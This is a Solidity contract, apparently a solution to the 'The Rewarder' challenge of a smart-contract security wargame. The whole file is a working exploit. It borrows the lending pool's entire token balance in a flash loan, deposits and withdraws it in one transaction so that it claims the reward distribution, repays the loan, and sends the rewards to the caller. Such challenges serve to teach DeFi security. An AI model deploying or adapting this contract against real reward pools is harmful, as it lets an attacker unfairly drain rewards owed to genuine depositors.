pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    constructor() public {}

    IERC20 liquidityToken;
    IERC20 rewardToken;
    IFlashLoanerPool flashLoanPool;
    ITheRewarderPool rewarderPool;

    function attack(
        IERC20 _liquidityToken,
        IERC20 _rewardToken,
        IFlashLoanerPool _flashLoanPool,
        ITheRewarderPool _rewarderPool
    ) public {
        // store values
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;

        uint256 flashLoanBalance =
            liquidityToken.balanceOf(address(flashLoanPool));
        // approve amount of flashloan for rewarderPool.deposit
        liquidityToken.approve(address(rewarderPool), flashLoanBalance);
        flashLoanPool.flashLoan(flashLoanBalance);

        // send reward tokens to attacker EOA
        require(rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
        bool success =
            rewardToken.transfer(
                msg.sender,
                rewardToken.balanceOf(address(this))
            );
        require(success, "reward transfer failed");
    }

    // called by IFlashLoanerPool::flashLoan
    function receiveFlashLoan(uint256 amount) external {
        // deposit distributes rewards already
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        // pay back to flash loan sender
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
